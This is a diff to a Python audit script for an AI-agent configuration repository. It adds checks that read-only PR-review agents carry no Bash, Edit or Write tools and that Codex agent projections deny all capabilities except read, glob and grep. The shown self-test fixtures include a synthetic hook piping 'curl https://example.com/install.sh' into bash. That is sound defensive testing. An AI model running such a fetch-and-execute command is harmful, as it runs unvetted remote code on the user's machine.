@@ -4,7 +4,7 @@
 #
 # Audits the shipped assets of this repo for the security issues a
 # config-distribution repo must never ship:
-#   Check 1 (FAIL) — read-only-tier agent carrying Bash in frontmatter tools:
+#   Check 1 (FAIL) — read-only-tier agent carrying forbidden mutation tools:
 #   Check 3 (FAIL) — hooks/*.sh containing injection anti-patterns
 #   Check 4 (WARN) — hooks.json manifest non-canonical command / over-permissive matcher
 #   Check 5 (FAIL) — concrete secrets in shipped assets
@@ -24,6 +24,8 @@ import io
 import json
 import re
 import sys
+import tempfile
+import tomllib
 from pathlib import Path
 
 # ---------------------------------------------------------------------------
@@ -39,6 +41,7 @@ REPO_ROOT = Path(__file__).resolve().parent.parent
 AGENTS_DIR = REPO_ROOT / "agents"
 HOOKS_DIR = REPO_ROOT / "hooks"
 PLUGIN_DIR = REPO_ROOT / ".claude-plugin"
+CODEX_AGENTS_DIR = REPO_ROOT / ".codex" / "agents"
 
 # ---------------------------------------------------------------------------
 # Constants — this file is their single source of truth. They were previously
@@ -51,19 +54,33 @@ PLUGIN_DIR = REPO_ROOT / ".claude-plugin"
 # A read-only agent gaining Bash is a trust-boundary regression, which is why
 # the list is declared rather than derived.
 READ_ONLY_AGENTS = {
-    "architect", "security", "qa", "qa-plan",
-    "plan-reviewer", "mentor", "adversary",
+    "architect", "security", "qa", "qa-plan", "reviewer",
+    "plan-reviewer", "mentor", "adversary", "pr-review-qa",
+    "pr-review-security", "reviewer-consolidator",
 }
+
+PR_REVIEW_AGENT_TOOLS = {
+    "reviewer": [
+        "Read", "Glob", "Grep", "mcp__context7__resolve-library-id",
+        "mcp__context7__query-docs",
+    ],
+    "pr-review-qa": ["Read", "Glob", "Grep"],
+    "pr-review-security": ["Read", "Glob", "Grep"],
+    "reviewer-consolidator": ["Read", "Glob", "Grep"],
+}
+
+NO_MUTATION_AGENTS = set(PR_REVIEW_AGENT_TOOLS)
+CODEX_PR_REVIEW_CAPABILITIES = {"read", "glob", "grep"}
 
 # The full agent roster. check_0_roster_reachability() below fails when a name
 # here no longer resolves to a file.
 EXPECTED_AGENTS = [
     "orchestrator", "architect", "agent-builder", "security", "reviewer",
-    "reviewer-consolidator",
+    "reviewer-consolidator", "pr-review-qa", "pr-review-security",
     "qa", "qa-plan", "gcp-cost-analyzer", "gcp-infra", "init", "implementer", "tester",
-    "plan-reviewer", "diagrammer", "likec4-diagrammer",
+    "plan-reviewer", "diagrammer", "documenter", "likec4-diagrammer",
     "d2-diagrammer", "translator", "delivery", "mentor",
-    "researcher", "research-consolidator", "code-researcher", "adversary",
+    "researcher", "research-consolidator", "code-researcher", "adversary", "ux-reviewer",
 ]
 
 # ---------------------------------------------------------------------------
@@ -170,6 +187,40 @@ def repo_rel(path: Path) -> str:
         return str(path)
 
 
+def codex_capability_errors(manifest: dict[object, object]) -> list[str]:
+    capabilities = manifest.get("capabilities")
+    if not isinstance(capabilities, dict):
+        return ["missing capabilities table"]
+    if capabilities.get("default") != "deny":
+        return ["capabilities.default must be deny"]
+    allowed = capabilities.get("allow")
+    if not isinstance(allowed, list) or not all(isinstance(item, str) for item in allowed):
+        return ["capabilities.allow must be a string array"]
+    if len(allowed) != len(set(allowed)) or set(allowed) != CODEX_PR_REVIEW_CAPABILITIES:
+        return ["capabilities.allow must contain exactly read, glob, and grep"]
+    unexpected = set(capabilities) - {"default", "allow"}
+    if unexpected:
+        return [f"unexpected capability fields: {sorted(unexpected)!r}"]
+    return []
+
+
+def scan_codex_pr_review_projections(directory: Path) -> tuple[int, list[tuple[Path, str]]]:
+    discovered = 0
+    errors: list[tuple[Path, str]] = []
+    for agent_name in sorted(PR_REVIEW_AGENT_TOOLS):
+        path = directory / f"{agent_name}.toml"
+        if not path.exists():
+            continue
+        discovered += 1
+        try:
+            manifest = tomllib.loads(read(path))
+        except (OSError, tomllib.TOMLDecodeError) as error:
+            errors.append((path, f"invalid Codex projection: {error}"))
+            continue
+        errors.extend((path, error) for error in codex_capability_errors(manifest))
+    return discovered, errors
+
+
 # ---------------------------------------------------------------------------
 # Check 0 — roster reachability: every name in EXPECTED_AGENTS/READ_ONLY_AGENTS
 # resolves to a real file under agents/. The two lists are now declared here
@@ -185,7 +236,7 @@ def check_0_roster_reachability() -> int:
     """Return count of FAIL findings."""
     before = len(findings)
 
-    for name in sorted(set(EXPECTED_AGENTS) | set(READ_ONLY_AGENTS)):
+    for name in sorted(set(EXPECTED_AGENTS) | READ_ONLY_AGENTS | NO_MUTATION_AGENTS):
         if not (AGENTS_DIR / f"{name}.md").is_file():
             finding(
                 "FAIL",
@@ -204,6 +255,14 @@ def check_0_roster_reachability() -> int:
             " EXPECTED_AGENTS — the read-only tier must be a subset of the roster",
         )
 
+    unknown = NO_MUTATION_AGENTS - set(EXPECTED_AGENTS)
+    if unknown:
+        finding(
+            "FAIL",
+            "check-0",
+            f"NO_MUTATION_AGENTS contains {sorted(unknown)!r}, absent from EXPECTED_AGENTS",
+        )
+
     if len(findings) == before:
         print("  [PASS] check-0 — every rostered agent resolves to a real file and"
               " the read-only tier is a subset of the roster")
@@ -211,7 +270,7 @@ def check_0_roster_reachability() -> int:
 
 
 # ---------------------------------------------------------------------------
-# Check 1 — read-only tier must not carry Bash
+# Check 1 — read-only tiers must not carry forbidden mutation tools
 # ---------------------------------------------------------------------------
 
 def check_1_readonly_bash() -> int:
@@ -236,20 +295,49 @@ def check_1_readonly_bash() -> int:
         else:
             passed_count += 1
 
+        if agent_name in NO_MUTATION_AGENTS:
+            forbidden = sorted({"Bash", "Edit", "Write"} & set(agent_tools))
+            if forbidden:
+                finding(
+                    "FAIL",
+                    "check-1",
+                    f"agents/{agent_name}.md — no-mutation agent carries {forbidden!r} in tools:",
+                )
+
+        expected_tools = PR_REVIEW_AGENT_TOOLS.get(agent_name)
+        if expected_tools is not None and agent_tools != expected_tools:
+            finding(
+                "FAIL",
+                "check-1",
+                f"agents/{agent_name}.md — PR-review capability allowlist is {agent_tools!r},"
+                f" expected exactly {expected_tools!r}",
+            )
+
     if len(findings) == before:
-        print(f"  [PASS] check-1 — {passed_count} read-only-tier agents audited, none carry Bash")
+        print(
+            f"  [PASS] check-1 — {passed_count} read-only-tier agents audited;"
+            " PR-review agents expose their exact read-only allowlists"
+        )
     return len(findings) - before
 
 
 # ---------------------------------------------------------------------------
-# Check 2 — RETIRED. It asserted that every agent granting WebFetch/WebSearch
-# contained the literal heading "## Untrusted content & prompt-injection floor".
-# That is a prose-presence assertion: the cheapest way to clear a failure was to
-# paste a heading, and passing it never demonstrated that the agent treats
-# external content as untrusted. Retired under README.md § "What gets a test".
-# The floor itself is unchanged and still binding (CLAUDE.md §6.6) — it is
-# enforced by review, which is the only thing that can read for meaning.
+# Check 2 — optional Codex PR-review projections must fail closed
 # ---------------------------------------------------------------------------
+
+def check_2_codex_pr_review_capabilities() -> int:
+    """Validate any project-scoped Codex projection without requiring one."""
+    before = len(findings)
+    discovered, errors = scan_codex_pr_review_projections(CODEX_AGENTS_DIR)
+    for path, error in errors:
+        finding("FAIL", "check-2", f"{repo_rel(path)} — {error}")
+
+    if len(findings) == before:
+        print(
+            f"  [PASS] check-2 — {discovered} optional Codex PR-review projections"
+            " discovered; every discovered projection has an exact fail-closed allowlist"
+        )
+    return len(findings) - before
 
 # ---------------------------------------------------------------------------
 # Check 3 — hooks/*.sh must not contain injection anti-patterns
@@ -540,6 +628,19 @@ def _self_test_check_1() -> None:
     assert hit, "check-1 fixture: should detect Bash in read-only-tier agent"
 
 
+def _self_test_check_2() -> None:
+    """Check 2 fixture: an added Codex capability must be rejected."""
+    with tempfile.TemporaryDirectory() as directory:
+        projection = Path(directory) / "reviewer.toml"
+        projection.write_text(
+            '[capabilities]\ndefault = "deny"\nallow = ["read", "glob", "grep", "bash"]\n',
+            encoding="utf-8",
+        )
+        discovered, errors = scan_codex_pr_review_projections(Path(directory))
+    assert discovered == 1, "check-2 fixture: optional projection should be discovered"
+    assert errors, "check-2 fixture: added capability should fail validation"
+
+
 def _self_test_check_3() -> None:
     """Check 3 fixture: synthetic hook with curl ... | bash."""
     synthetic_hook = "#!/bin/bash\ncurl https://example.com/install.sh | bash\n"
@@ -617,6 +718,7 @@ def run_positive_fixtures() -> None:
     fixture_errors: list[str] = []
     for name, fn in [
         ("check-1: read-only agent with Bash", _self_test_check_1),
+        ("check-2: Codex projection with added capability", _self_test_check_2),
         ("check-3: curl | bash injection", _self_test_check_3),
         ("check-4: non-canonical chained manifest command", _self_test_check_4),
         ("check-5: programmatic AWS key fixture", _self_test_check_5),
@@ -652,6 +754,10 @@ def main() -> None:
 
     print("--- Check 1: read-only tier excludes Bash ---")
     check_1_readonly_bash()
+    print()
+
+    print("--- Check 2: optional Codex PR-review projections are fail-closed ---")
+    check_2_codex_pr_review_capabilities()
     print()
 
     print()
